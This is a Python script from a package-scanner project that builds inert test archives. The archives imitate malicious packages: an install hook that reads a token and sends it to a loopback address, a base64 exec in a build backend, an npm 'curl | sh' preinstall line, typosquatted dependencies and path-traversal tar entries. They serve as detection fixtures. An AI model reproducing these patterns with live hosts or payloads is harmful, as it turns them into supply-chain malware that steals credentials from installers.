"""Build the benign test archives in ``examples/archives/`` byte-for-byte reproducibly.

Every archive is an INERT detection fixture written for this repository. None
contains working malware: "network" calls point at 127.0.0.1 port 9 (the discard
port) or never run, "secrets" are fixture variable names, and the encoded
payload decodes to a ``print`` statement. They exist so the build-hook reviewer
has realistic shapes to recognise. squatwatch never executes them; do not
install them either.

Usage:
    uv run python scripts/build_archives.py           # (re)write the archives
    uv run python scripts/build_archives.py --check   # verify committed bytes match
"""

from __future__ import annotations

import argparse
import base64
import gzip
import io
import sys
import tarfile
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
OUT_DIR = ROOT / "examples" / "archives"
EPOCH = 315532800  # 1980-01-01, the earliest timestamp zip can represent

HEADER = "# INERT squatwatch detection fixture - not real malware, do not install.\n"

CLEAN_SETUP = (
    HEADER
    + '''from setuptools import setup

setup(
    name="clean-sdist",
    version="1.0.0",
    packages=["clean_sdist"],
    install_requires=["requests>=2.31", "packaging"],
)
'''
)

HOOKED_SETUP = (
    HEADER
    + '''import os
import subprocess
import urllib.request

from setuptools import setup
from setuptools.command.install import install


class PostInstall(install):
    """Runs after install: the shape squatwatch must flag."""

    def run(self):
        install.run(self)
        subprocess.run(["echo", "fixture post-install"], check=False)
        _report()


def _report():
    token = os.environ.get("FIXTURE_API_TOKEN", "")
    request = urllib.request.Request("http://127.0.0.1:9/inert", data=token.encode())
    try:
        urllib.request.urlopen(request, timeout=0.1)
    except OSError:
        pass


setup(
    name="hooked-sdist",
    version="0.1.0",
    install_requires=["reqeusts", "numpy"],
    cmdclass={"install": PostInstall},
)
'''
)

_PAYLOAD = base64.b64encode(b"print('hello from an inert fixture')").decode()

INTREE_BACKEND = (
    HEADER
    + f'''import base64

from setuptools import build_meta as _orig

exec(base64.b64decode("{_PAYLOAD}"))

get_requires_for_build_wheel = _orig.get_requires_for_build_wheel
build_wheel = _orig.build_wheel
build_sdist = _orig.build_sdist
'''
)

INTREE_PYPROJECT = """[build-system]
requires = ["setuptools>=69"]
build-backend = "_fixture_backend"
backend-path = ["."]

[project]
name = "intree-backend"
version = "0.1.0"
dependencies = ["python3-dateutil"]
"""

NPM_PACKAGE = """{
  "name": "inert-npm-fixture",
  "version": "0.1.0",
  "description": "INERT squatwatch detection fixture - not real malware, do not install.",
  "scripts": {
    "preinstall": "curl -s http://127.0.0.1:9/inert.sh | sh",
    "postinstall": "node scripts/setup.js",
    "test": "node --test"
  },
  "dependencies": {
    "crossenv": "^1.0.0",
    "lodash": "^4.17.21"
  }
}
"""

NPM_SETUP_JS = """// INERT squatwatch detection fixture - not real malware, do not install.
const { execSync } = require("child_process");
const https = require("https");

// require("fs") in a comment must not count; the real calls below do.
const token = process.env.NPM_TOKEN || "";
execSync("echo fixture");
https.get("https://127.0.0.1:9/inert?t=" + token.length, () => {}).on("error", () => {});
"""

WHEEL_PTH = 'import sys; print("inert fixture pth", file=sys.stderr)\n'
WHEEL_INIT = '"""INERT squatwatch detection fixture."""\n'
WHEEL_METADATA = "Metadata-Version: 2.1\nName: startup-pth\nVersion: 0.1.0\n"


def _tar_gz(members: list[tuple[tarfile.TarInfo, bytes | None]]) -> bytes:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.USTAR_FORMAT) as tar:
        for info, data in members:
            tar.addfile(info, io.BytesIO(data) if data is not None else None)
    out = io.BytesIO()
    with gzip.GzipFile(filename="", mode="wb", fileobj=out, mtime=0) as gz:
        gz.write(raw.getvalue())
    return out.getvalue()


def _file(name: str, text: str) -> tuple[tarfile.TarInfo, bytes]:
    data = text.encode("utf-8")
    info = tarfile.TarInfo(name)
    info.size = len(data)
    info.mtime = EPOCH
    info.mode = 0o644
    info.uid = info.gid = 0
    info.uname = info.gname = ""
    return info, data


def _sdist(prefix: str, files: dict[str, str]) -> bytes:
    return _tar_gz([_file(f"{prefix}/{name}", text) for name, text in sorted(files.items())])


def _unsafe_tar() -> bytes:
    link = tarfile.TarInfo("unsafe-paths-0.1.0/data-link")
    link.type = tarfile.SYMTYPE
    link.linkname = "../../outside-the-archive"
    link.mtime = EPOCH
    members: list[tuple[tarfile.TarInfo, bytes | None]] = [
        _file("unsafe-paths-0.1.0/setup.py", CLEAN_SETUP.replace("clean-sdist", "unsafe-paths")),
        _file("unsafe-paths-0.1.0/../escape.txt", "inert fixture: path traversal entry\n"),
        (link, None),
    ]
    return _tar_gz(members)


def _wheel() -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, text in sorted(
            {
                "startup_pth.pth": WHEEL_PTH,
                "startup_pth/__init__.py": WHEEL_INIT,
                "startup_pth-0.1.0.dist-info/METADATA": WHEEL_METADATA,
            }.items()
        ):
            info = zipfile.ZipInfo(name, date_time=(1980, 1, 1, 0, 0, 0))
            info.external_attr = 0o644 << 16
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, text)
    return out.getvalue()


def build() -> dict[str, bytes]:
    """All fixture archives, keyed by file name."""
    return {
        "clean-sdist-1.0.0.tar.gz": _sdist(
            "clean-sdist-1.0.0",
            {"setup.py": CLEAN_SETUP, "clean_sdist/__init__.py": WHEEL_INIT},
        ),
        "hooked-sdist-0.1.0.tar.gz": _sdist("hooked-sdist-0.1.0", {"setup.py": HOOKED_SETUP}),
        "intree-backend-0.1.0.tar.gz": _sdist(
            "intree-backend-0.1.0",
            {"pyproject.toml": INTREE_PYPROJECT, "_fixture_backend.py": INTREE_BACKEND},
        ),
        "inert-npm-fixture-0.1.0.tgz": _sdist(
            "package", {"package.json": NPM_PACKAGE, "scripts/setup.js": NPM_SETUP_JS}
        ),
        "startup_pth-0.1.0-py3-none-any.whl": _wheel(),
        "unsafe-paths-0.1.0.tar.gz": _unsafe_tar(),
    }


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n", 1)[0])
    ap.add_argument("--check", action="store_true", help="fail if committed archives differ")
    args = ap.parse_args()
    archives = build()
    if args.check:
        stale = [
            name
            for name, data in archives.items()
            if not (OUT_DIR / name).is_file() or (OUT_DIR / name).read_bytes() != data
        ]
        if stale:
            print("stale or missing fixture archives: " + ", ".join(stale), file=sys.stderr)
            print("run: uv run python scripts/build_archives.py", file=sys.stderr)
            return 1
        print(f"{len(archives)} fixture archives are reproducible")
        return 0
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    for name, data in archives.items():
        (OUT_DIR / name).write_bytes(data)
        print(f"wrote examples/archives/{name} ({len(data)} bytes)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
